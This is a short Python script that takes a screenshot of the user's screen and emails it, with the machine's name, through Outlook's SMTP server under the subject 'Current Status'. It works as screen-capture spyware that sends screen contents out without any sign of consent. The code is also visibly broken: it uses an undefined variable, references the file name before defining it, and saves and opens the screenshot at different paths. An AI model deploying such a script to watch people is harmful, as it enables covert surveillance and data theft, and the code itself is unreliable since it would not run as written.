#Screenshots
import pyautogui
import platform

#Email imports
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

#OS
import os

#provide email/Password
email_user = ''
email_password = ''

User = os.getenv('USERNAME')


#sets up email message
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_user
msg['Subject'] = 'Current Status'

Device = platform.uname()[1]

body = "Status on {}".format(Device)

msg.attach(MIMEText(body,'plain')) 


#screenshot current screen
pyautogui.screenshot('/Users/' + Users + '/Documents/Log/' + filename)





filename='screenShit.png'
attachment  = open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+ filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.outlook.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_user,text)
server.quit()
attachment.close() 



